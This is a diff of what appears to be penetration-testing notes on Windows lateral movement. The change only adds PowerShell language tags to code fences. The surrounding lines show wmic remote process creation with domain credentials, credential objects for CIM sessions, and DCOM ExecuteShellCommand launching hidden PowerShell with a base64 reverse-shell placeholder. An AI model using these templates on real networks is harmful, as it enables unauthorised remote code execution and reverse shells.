@@ -14,7 +14,7 @@ Useful when we can't install something like ligolo and pivot to compromise an in
 	- `wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create "{process}"`
 	- To use with powershell, we need to turn the password into a secure string and pass a reverse shell:
 
-```
+```Powershell
 $username = '{domain_user}';
 $password = '{password}';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -44,7 +44,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`
 
 
-```
+```Powershell
 $username = '{domain_user}';
 $password = '{password}';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
